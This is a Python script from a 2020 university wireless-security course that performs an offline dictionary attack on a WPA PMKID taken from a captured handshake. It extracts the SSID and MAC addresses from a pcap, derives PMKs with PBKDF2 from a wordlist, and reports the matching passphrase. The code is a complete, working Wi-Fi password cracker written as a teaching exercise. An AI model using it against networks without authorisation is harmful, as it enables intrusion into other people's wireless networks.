#!/bin/python
# -*- coding: utf-8 -*-

"""
Hack the PMKID found in the given pcap file.
"""

__author__    = "Pierre Kohler & Jonathan Zaehringer"
__copyright__ = "Copyright 2020, HEIG-VD SWI course"
__license__   = "GPL"
__version__   = "1.0"
__email__     = "pierre.kohler@heig-vd.ch, jonathan.zaehringer@heig-vd.ch"
__status__    = "Prototype"

import hashlib
import hmac

from binascii import a2b_hex, hexlify
from pbkdf2 import *
from scapy.all import *


def main():
    wpa = rdpcap("./PMKID_handshake.pcap")

    ssid = wpa[144].info  # Get the ssid from a beacon
    AP_mac = a2b_hex(wpa[145].addr2.replace(':',
                                            '').lower())  # Get AP mac address from Source of the first packet of the 4-way handshake
    client_mac = a2b_hex(wpa[145].addr1.replace(':',
                                                '').lower())  # Get STA mac address  from Source of the first packet of the 4-way handshake
    pmkid_to_test = hexlify(wpa[145].load)[202:234]  # Get the pmkid from the first packet of the 4-way handshake
    pmk_name = "PMK Name".encode()

    # Get dictionary for testing passPhrase
    with open("wordlist") as f:
        dico = f.readlines()

    for i, word in enumerate(dico):
        # Get one possible passPhrase from the dictionary
        passPhrase = str.encode(word[:-1])

        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = a2b_hex(PBKDF2(passPhrase, ssid, 4096).hexread(32))
        # calculate our own PMKID
        pmkid = str.encode(hmac.new(pmk, pmk_name + AP_mac + client_mac, hashlib.sha1).hexdigest()[:32])

        if pmkid_to_test == pmkid:
            print("\nPass phrase found! It's \"%s\"." % word[:-1])
            exit(0)
        elif i % 10 == 0:
            print('.', end='')


if __name__ == "__main__":
    main()
